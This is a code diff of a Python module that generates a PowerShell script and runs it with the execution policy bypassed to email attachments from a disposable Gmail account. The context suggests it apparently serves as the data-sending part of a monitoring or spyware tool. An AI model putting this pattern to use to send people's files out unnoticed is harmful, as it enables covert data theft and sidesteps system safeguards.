@@ -5,9 +5,9 @@ import subprocess,traceback
 # provide the credentials for you gmail account (not the main one ofc)*
 # configure the account to accept untrusted apps
 
-REC_ADD = "youremailaddress"
-SEN_ADD = "youremailaddress"
-SEN_PASS = "password"
+REC_ADD = "your email"
+SEN_ADD = "your email"
+SEN_PASS = "your password"
 
 # PowerShell script to use
 script = '''Param([String]$Att,[String]$Subj,[String]$Body)
@@ -89,8 +89,7 @@ def create_script():
 def send_mail(subj,body,attachment):
     try:
         file_path = Io.os.path.join(Io.getThePath(),script_file_name)
-        if Io.check_file(file_path) == False:
-            result = create_script()
+        create_script()
         # defining the params of our script (emailing)
         to_execute = f'powershell.exe -ExecutionPolicy ByPass -File "{file_path}" -Subj "{subj}" -Body "{body}" -Att "{attachment}"'
         # Running the script (using powershell and script file + params for the script)
@@ -98,5 +97,6 @@ def send_mail(subj,body,attachment):
         Io.logEvent(f"<Result of Email Sending> [{subj},{body},{attachment}]: {process_result.returncode}")
         return process_result
     except Exception:
-        Io.logEvent(f"<Problem in Email Sending>")
+        Io.logEvent(f"{Helper.getDateTimeString()}: <Problem in Email Sending>")
         return 1
+
